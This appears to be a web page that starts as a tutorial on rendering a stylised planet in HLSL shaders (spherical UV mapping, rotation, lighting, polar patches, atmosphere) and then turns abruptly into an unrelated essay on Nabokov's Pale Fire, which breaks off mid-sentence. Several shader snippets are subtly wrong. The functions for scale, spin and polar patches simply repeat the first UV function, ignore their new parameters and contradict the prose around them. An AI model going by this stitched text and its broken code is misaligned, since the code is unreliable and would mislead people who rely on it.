<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/01\/HalfCircleEquation.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-224&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Generatrix equation&quot;,&quot;alt&quot;:&quot;Generatrix equation&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-1024x576.jpg" alt="Generatrix equation" srcset="https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/01/HalfCircleEquation-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The ‘local width’ of the sphere, or the generatrix, is then used to pinch the coordinates at the poles. This is achieved by dividing the x-component of the surface position.</p>



<div><pre data-lang="HLSL"><code>float2 GenerateSphericalUV(float3 position)
{
    float width = sqrt(1.0 - position.y * position.y);
    float generatrixX = position.x / width * sign(position.z);
    float2 generatrix = float2(generatrixX, position.y);
    float2 uv = asin(generatrix) / 3.14159 + float2(0.5, 0.5);  
    return float2(uv);
}</code></pre></div>



<h2>Orientation</h2>



<p>To make the planet look more natural, we need to adjust the orientation of its axis, specifically the pitch and roll. Planets in the sci-fi art are usually tilted, as it creates more dynamic composition and allows to show ice capes on the poles.</p>



<p>The yaw, which corresponds to the planet’s spinning motion, will be dealt with in separate step to avoid the seam issue mentioned when discussing UV spheres.</p>







<p>In the conventional approach, a mesh sphere is typically reoriented or transformed using a matrix.  In our case, where each pixel defines the surface position, we can use a simplified 3⨯3 matrix limited to rotation – eliminating the need for a full set of transformations.</p>



<p>Building such a matrix is pretty straightforward. Identify the ‘right,’ ‘up,’ and ‘forward’ vectors of the rotated sphere and organize them as columns in the matrix.</p>

<p>In HLSL 3⨯3 matrix can be represented using float3x3:</p>



<div><pre data-lang="HLSL"><code>float3x3 CreateRotationMatrix(float pitch, float roll) {
    float cosPitch = cos(pitch);
    float sinPitch = sin(pitch);
    float cosRoll = cos(roll);
    float sinRoll = sin(roll);

    return (float3x3)(
        cosRoll, -sinRoll * cosPitch, sinRoll * sinPitch,
        sinRoll, cosRoll * cosPitch, -cosRoll * sinPitch,
        0.0, sinPitch, cosPitch
    );
}</code></pre></div>



<h2>Scale</h2>







<p>Before adding the spinning motion, there is one problem that needs to be adressed – uv seams. Right now the texture is mapped in such a way, that the seams are aligned with the edges of the texture, and thus invisible. But if we change the scale, the discontinuity becomes obvious. It is not a problem that can be easily solved, but it can be partially masked by moving to the backside. This requires changes in mapping function:</p>



<div><pre data-lang="HLSL"><code>float2 GenerateSphericalUV(float3 position, float scale)
{
    float width = sqrt(1.0 - position.y * position.y);
    float generatrixX = position.x / width * sign(position.z);
    float2 generatrix = float2(generatrixX, position.y);
    float2 uv = asin(generatrix) / 3.14159 + float2(0.5, 0.5);  
    return float2(uv);
}</code></pre></div>



<h2>Rotation</h2>



<p>With all the prerequisites in place, adding the spinning is straightforward, even if counterintuitive. To keep the seam in well masked position, we will not rotater sphere’s surface, but pan the surface texture along x axis. </p>



<div><pre data-lang="HLSL"><code>float2 GenerateSphericalUV(float3 position, float scale, float spin)
{
    float width = sqrt(1.0 - position.y * position.y);
    float generatrixX = position.x / width * sign(position.z);
    float2 generatrix = float2(generatrixX, position.y);
    float2 uv = asin(generatrix) / 3.14159 + float2(0.5, 0.5);  
    return float2(uv);
}</code></pre></div>



<div><pre data-lang="HLSL" data-start="6"><code>float2 sphericalVU = GenerateSphericalUV(position, scale, time*speed)</code></pre></div>







<h2>Shading</h2>



<p>For the ball to appear truly round, shading is crucial. Typically, it would be handled by the engine, but in the case of a planet, it is not that easy. A planet consists of two distinctive layers – the surface and the atmosphere. Typical materials describe only one medium. Therefore, we have to define how both layers are lit and blend them together manually.</p>



<h3>Normal</h3>



<p>Regardless of the chosen shading model, surface normal must be provided. Fortunately it is already there – surface position, before rotation, in case where radius is 1 is equal to surface normal. It is enough to perform basic shading.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/PositionToNormal.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-298&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Normal and surface vector similiarity&quot;,&quot;alt&quot;:&quot;Normal and surface vector similiarity&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-1024x576.jpg" alt="Normal and surface vector similiarity" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/PositionToNormal-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>Light</h3>



<p>I want to replicate the aesthetics of sci-fi book covers, with a stylized version inspired by NASA photos. Realism isn’t my primary concern. I’ll be using the simplest Lambertian model, where the light is equal to the dot product of the surface normal and light vector.</p>



<div><pre data-lang="HLSL"><code>float LambertianLight(float3 normal, float3 lightDirection) {
    float NdotL = max(dot(normal, lightDirection), 0.0);
    return NdotL;
}</code></pre></div>







<h3>Bump Mapping</h3>



<p>A simple normal might suffice for cases where the planet appears smooth, such as gas giants. However, planets with rocky surfaces are often covered with geological formations like mountains, ridges, or craters. These are best simulated using normal maps.</p>



<p>To use normal maps, we require a complete set of vectors: Tangent, Bitangent, and Normal. This set comprises three unit vectors perpendicular to each other and aligned to UV mapping. These vectors can be thought of as ‘UV Local Space’.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/TBNExplained-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-669&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: TBN set in general case&quot;,&quot;alt&quot;:&quot;TBN set in general case&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="http://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-1024x576.jpg" alt="TBN set in general case" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/TBNExplained-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In the case of a sphere, calculations need to be done per pixel. It’s often convenient to store these calculations as columns of the TBN matrix. This matrix can then be used to recalculate the normal from the normal map into World Space Coordinates.</p>

<h2>UV Discontinuities</h2>



<p>When discussing the generation of UV coordinates in the pixel shader, one critical topic to address is discontinuities. Take, for instance, the case of the back seam – the horizontal component of the UV should wrap perfectly as it is equal to 0.0 and 1.0 on the borders. However, instead of a seamless transition, there is a line of blocky artifacts along the seam.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/DDXDiscontinuity.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-676&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Source of ddx seam&quot;,&quot;alt&quot;:&quot;Source of ddx seam&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-1024x576.jpg" alt="Source of ddx seam" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/DDXDiscontinuity-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This line corresponds to the DDX of the UV. DDX and DDY, in this case, measure the rate of change of UV in the respective screen space axes. They are then fed into the texture sampler and used to determine which mipmap to use. Low values of UV derivative correspond to a high-resolution mipmap, and vice versa.</p>

<p>There’s a ‘jump’ in values between the left and right sides of the seam, causing the DDX to be high. Consequently, the texture is sampled from the lowest mipmap, resulting in the gray color.</p>



<p>In the case of a planet, it won’t be a significant issue, as it will be covered with a polar patch anyway. However, in other visually jarring scenarios, the DDX and DDY of the seam have to be manually corrected and fed into the sampler.</p>

<p>The presented ‘fix’ is merely for illustrative purposes. Typically, formulas for proper values of DDX and DDY have to be derived manually to match the mapping accurately.</p>



<h2>Polar Patches</h2>



<p>Last problem that needs adressing is the distortion on the poles. As mentioned before – the tried and tested solution is to just cover them. Seems like a hack, but in the case of a planet or a moon makes a lot of sense. Polar areas are often covered with ice, and visually distinct from the rest of the planet, so having a patch of different texture not only hides the prolem but also add visual interest.</p>

<p>Easiest way to add polar patch wolud be to map it in the plane perpendicular to the axis of rotation and rotate resulting coordinates:</p>



<div><pre data-lang="HLSL"><code>float2 PolarPatchMapping(float3 position, float scale, float spin)
{
    float width = sqrt(1.0 - position.y * position.y);
    float generatrixX = position.x / width * sign(position.z);
    float2 generatrix = float2(generatrixX, position.y);
    float2 uv = asin(generatrix) / 3.14159 + float2(0.5, 0.5);  
    return float2(uv);
}</code></pre></div>







<h2>Atmosphere</h2>

<p>Planet’s surface doesn’t occupy the entire area of the disk, leaving enough space to draw the atmospheric halo. Drawn with the same shader, it can be seamlessly merged with the atmosphere drawn over the planet.</p>

<p>There are countless whitepapers discussing atmosphere rendering. Most are <a href="https://en.wikipedia.org/wiki/Rayleigh_scattering">physically based</a> and rely on raymarching to deliver the most realistic image possible. I will use none of them. There is a nice trick from Quake I want to try.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/Quake2MonsterLighting-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-689&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Quake 2 screenshot&quot;,&quot;alt&quot;:&quot;Quake 2 screenshot&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-1024x576.jpg" alt="Quake 2 screenshot" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2MonsterLighting-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In both Quake 1 and 2, lighting was achieved using mostly lightmaps, a technique popular at the time and still used until recently for static light scenarios. In this approach, computationally expensive lighting calculations are precomputed during development and stored as a separate texture covering all surfaces in the level.</p>



<p>However, since lightmaps only work for static lighting, idSoftware had to devise a solution for dynamic objects like monsters. They sampled the lightmap below the dynamic object and used it to modulate the color of the object. While this technique wasn’t physically accurate, it was good enough to make the monster blend with its surroundings.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/Quake2LightmapSampling-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-731&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Quake2 character light&quot;,&quot;alt&quot;:&quot;Quake2 character light&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-1024x576.jpg" alt="Quake2 character light" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/Quake2LightmapSampling-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In a similar manner, I’ll use the planet’s surface to approximate the lighting of the atmospheric halo. It is enough to extend the surface normal before bump mapping to calculate the halo’s brightness.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/AtmosphericNormalAndLight.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-711&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Extended surface normal and light&quot;,&quot;alt&quot;:&quot;Extended surface normal and light&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-1024x576.jpg" alt="Extended surface normal and light" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphericNormalAndLight-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>To further enhance the effect, the brightness of each channel can be remapped differently. This is a simple yet effective method for simulating the absorption of different light wavelengths.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/MappedLambertLighting-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-717&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Remapped light color components&quot;,&quot;alt&quot;:&quot;Remapped light color components&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-1024x576.jpg" alt="Remapped light color components" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/MappedLambertLighting-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The visibility of the atmosphere is more pronounced at oblique angles. This effect can be replicated by remapping the Z component of the surface normal. Additionally, to recreate the halo’s fading effect, the distance from the sphere’s surface must be calculated.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/AtmosphereOpacity.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-721&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Light opacity components&quot;,&quot;alt&quot;:&quot;Light opacity components&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-1024x576.jpg" alt="Light opacity components" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/AtmosphereOpacity-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Finally, both the surface and atmosphere need to be alpha-blended together.</p>







<h2>Conclusions</h2>

<p>Although it took more steps than anticipated, the result works great. The planet is a perfect sphere, and the mapping allows for all the texture and shader manipulations I wanted. I can create a single Substance Designer graph generating surface texture, and the result doesn’t require any further post-processing. The same goes for animated texture – I can use a smaller size and thus save performance, then adjust the tiling as needed.</p>

It is so great it is terrifying to write about. This is not something I would normally confess, but in this case it seems better to just come out and say it, lest the reader feel the awful stammering of suppressed terror quavering through my words without knowing what they are feeling. It is terrifying! But I want to do it anyway, because although mighty brains from all over the planet have weighed in on the subject with breath-taking and exhaustive scholarly ardour, I feel that something essential about the book remains not exactly unseen but distinctly understated.</p> <p>Since its publication in 1962, people who admire <em>Pale Fire </em>— fawn upon it, adore it — like to speak of it as a feat of baroque intellectual magic, which it is. In her <em>New Republic</em> review, Mary McCarthy described it as “Faberge gem, a clockwork toy, a chess problem, an infernal machine, a trap to catch reviewers, a cat-and-mouse game, and do-it-yourself novel”, among other things. Brian Boyd, in his book <em>Nabokov’s Pale Fire: The Magic of Artistic Discovery, </em>writes densely and ecstatically about the novel as a near-endless array of ever-deepening “problems and possibilities”, an intellectual delight to explore; Ron Rosenbaum (in <em>The Observer</em>, circa 1999) declared the book “The Novel of the Century” based on the idea that it is a “theology of Shakespeare”, haunted by Shakespeare, housing Shakespeare, that it is, basically, a Shakespeare phantasmagoria. (Rosenbaum also acknowledges that the book is “an almost obscenely sensual pleasure”, but that is an aside.)</p> <p>The book has also been criticised for this very virtuosity, even dismissed by those who interpret the book’s brilliance as cold, wilfully weird or even hostile towards the reader. These opposing critical opinions are sincerely echoed by readers of all kinds, sometimes simultaneously. A friend of mine described his amazed delight in the book as something he might feel “if a winged griffin had landed on [his] lawn”, awed, but not moved emotionally — and secretly suspecting that the author might consider him a sucker if he <em>were </em>moved. An academic acquaintance who generally loves Nabokov considers it his least wonderful book, flawed by excessive cleverness, compulsive literary cross-referencing and the homophobic portrayal of its ridiculous and bitchy queer narrator, Charles Kinbote.</p> <p>It is true that Kinbote’s queerness is unflattering. (It is also not quite convincing; there is more narrative energy lavished on his dramatic woman-spurning than on his conquests of — or rejection by — men and boys.) Indeed, the generic condemnation “problematic” more than applies to the character Kinbote, a comically unpleasant personality who has been morally condemned or pitied by readers since his creation.</p></div></div>    <div>  <p>He appears on page one of the novel to explain that he is the editor of a poem titled <em>Pale Fire, </em>authored by his neighbour, friend and academic colleague, Professor John Shade, who has been recently murdered in error by an incompetent foreign agent dispatched to kill Kinbote. Kinbote, you see, is not your average college professor; that role is a disguise to hide his true identity as the fugitive King of Zembla, where he reigned as Charles the Beloved until an annoying crew of Soviet-style revolutionaries turned his beautiful world upside-down. Thus forced to take a drab teaching position at Wordsmith College in Wye, Appalachia, subletting the furnished home of a local judge (full of family pictures so distasteful to His Majesty that they are quickly consigned to the closet), Kinbote’s only consolation is his proximity to Shade who he truly admires — so much that he stalks Shade’s house to spy on him.</p> <p>Whether or not Kinbote is completely crazy is a question throughout the book — indeed his very identity is a question. From my point of view, he is just <em>somewhat crazy</em> and a lot desperate and has certainly taken advantage of Shade’s distraught widow in order to seize control of the poem so that he may explain to the world that it really is or at least <em>ought to have been </em>about him and his camouflaged royalty. After his fevered introduction, written from a cheap and desolate mountain hideaway, he presents the poem, 36 pages of wry, elegiac perhaps rather staid beauty. This is followed by 228 pages of Kinbote’s wildly self-centred commentary — even the suicide of John Shade’s daughter, poor homely Hazel, with whom Kinbote feels more empathic identification than anyone else, is seen through the fanatically minute lens of His Majesty’s Zemblan concerns. And then there is the almost mystically Kinbotian index, in which detailed notes are supplied for characters barely mentioned and it is revealed that the Zemblan assassin’s name spelled backwards is the name of a “mirror-maker of genius”.</p> <p>For all his fantastic humour, Kinbote seems the unintentional butt of his own jokes, the ultimate “unreliable narrator”, meant to be pitied or contrasted unfavourably with the imminently normal Shade. And yet… he reminds me of a line from Nabokov’s short story <em>Spring In Fialta </em>in which the narrator describes a circus poster “which depicted a red hussar and an orange tiger of sorts; curious — in his effort to make the beast as ferocious as possible, the artist had gone so far that he had come back from the other side, for the tiger’s face looked positively human”. If you replace the word “ferocious” with “grotesque” the tiger could be Kinbote.</p>  <p>Almost on introducing himself to us, at the beginning of his forward to Shade’s poem, Kinbote interrupts his faux scholarly description of the work with the non-sequitur, “There is a very loud amusement park right in front of my present lodgings”, before picking up right where he left off. It is one of a few small but telling oddities that made Brian Boyd<em>, </em>rhetorically remark: “What sort of person <em>is </em>this commentator?” I might answer, using a word that Nabokov would’ve hated and which I sort of hate too: a very relatable one. Someone who possesses a contemporary sensibility that feels free mixing a subjectively personal aside into what is supposed to be a scrupulous public presentation; someone who hates being pestered by loud noise when he is trying to think; someone so given to incongruous blurtings that he can be trusted to tell you the truth about himself even when he is lying.</p></div></div><div>  <p>It sounds complicated because it is. And I haven’t even mentioned the book’s most complicated aspect: the layers of patterns, linkages and intricate structure that give <em>Pale Fire</em> a kind of supernatural depth. The supernatural is literally a theme in the book, in the form of attempted communication between the living and the dead in weird partial words tapped out by a maybe spirit and flickering lights that show up in an Appalachian barn and are then incongruously refrained in the Zemblan tunnel King Charles traverses with one of his young loves. The colours red and green act in opposition/connection with characters and doors that link disparate times and places and the number eight; minor characters are doubled with Zemblan and Appalachian incarnations through similar names and attributes; the hiding place of the Crown Jewels is doubled as are the actual jewels; butterfly imagery links Hazel Shade, her mother Sybil and King Charles’s unwanted queen Disa — who is also linked with Hazel in a triple iteration of rejected girls.</p> <p>Dates and letters also join the fun! Kinbote, John Shade and Shade’s killer all have the same birthday; Shade is killed on the day that Nabokov’s father was born and Nabokov’s father was killed by a gunman aiming to kill someone else. The family pictures that Kinbote furiously stuffs into the closet of his sublet home are all of girls named in alphabetical order — an order reversed in the names of King Charles’s possibly invented royal family. And throughout, poets and poetry star the skies of Zembla and Appalachia alike: direct and subtle references to Browning, Shakespeare, Eliot and Goethe shine piercingly or dimly in the most quotidian and/or dramatic scenes, sometimes ostentatiously quoted, sometimes so simply and quietly <em>there</em> that only a scholar would notice.</p> <p>Only a scholar would notice most of these (and I haven’t even noted all of it), at least on the first reading; while I was aware of some of this layered patterning (the repetitive tropes of butterflies, dancing lights, opposing colours and rejected girls for example are hard to miss), I discovered most of what I’ve summarised above through critics, particularly Brian Boyd who’s book I love and recommend. Indeed the novel’s complexity has ironically unleashed armies of Kinbotes, devoting themselves to decades-long online arguments about whether or not the character John Shade invented Kinbote and faked his own death or if the reverse is true, that Kinbote actually invented Shade and wrote the poem attributed to him or — but wait! — that actually the deceased Hazel Shade spiritually transmitted the delusion of Zembla into Kinbote’s tortured mind so that he could tell her father about it and also to comfort Kinbote himself and further to create a more beautiful version of her own lonely life in his fantasy.</p> <p>“Indeed the novel’s complexity has ironically unleashed armies of Kinbotes, devoting themselves to decades-long online arguments…”</p> <p>To refrain McCarthy: “a clockwork toy, a chess problem, an infernal machine, <em>a trap to catch reviewers</em>…” Except that in the context of this fantastic novel, the critic’s theories are not as crazy as they appear on paper. I don’t find McCarthy’s words entirely right; the book is more like its own living universe than anything mechanical, and in such a world (as in ours) many strange things can happen. It is designed yes, but not to trap. It matters because I think this chess game emphasis has contributed to the popular perception of the book as steroidally brainy but emotionally cold. Critics haven’t exactly ignored the book’s touching aspects: the death of Hazel Shade and her parent’s grief are given their due as is the theme of mortality and the moving beauty of the natural world. (Though I agree with Michael Wood, in his essay <em>The Demons of Our Pity, </em>that there is something oddly shallow about the emotion towards Hazel in Shade’s poem, not to mention an unpleasant fixation on her homeliness.) But those emotional elements tend to get lost in the critical excitement about traps and problems and creates the impression that in order to enjoy <em>Pale Fire </em>you need not merely an intelligent mind but a <em>very particular type </em>of intelligent mind, preferably one outfitted with a first-class education.</p> <p>But. When I first read the book I was an ignorant 24-year-old with a barely adequate undergraduate education. Because I had not majored in English (I was concerned about what kind of job I might get after graduating and an English degree did not look promising), I had not taken many literature courses. I had read very little poetry and almost no Shakespeare. I recognised the names of the poets mentioned in <em>Pale Fire </em>but I could not possibly register the more subtle meanings evoked by the adjacent language because I didn’t know their work in any depth or really at all. That didn’t matter. I loved <em>Pale Fire. </em>I could feel its intellectual power in the intense perceptual contrasts of its characters, in the descriptions of faces and objects and, for example, the swift evocation of an alternate world in John Shade’s image of himself reflected in the window glass, “above the grass” with his furniture and an apple on a plate. I could feel it in the patterning I saw and sensed, viscerally, as if I was not only seeing a griffin landing before me but feeling the vibration of its wings come up through the ground into the soles of my feet.</p> <p>“I could feel its intellectual power in the intense perceptual contrasts of its characters.”</p> <p>But it wasn’t primarily the intellectual power that drew me in. I experienced <em>Pale Fire </em>far more emotionally than intellectually. I felt the emotion of longing saturating the story, the depth of Kinbote’s loneliness, the cruelty visited on Hazel and the bewilderment of her father at having lost her; I felt Kinbote’s anguish in his affected, light and giddy voice, and in the way those naturally polarised tones were electrically joined in the fast-moving comedy. (If you have read <em>Lolita, </em>it is 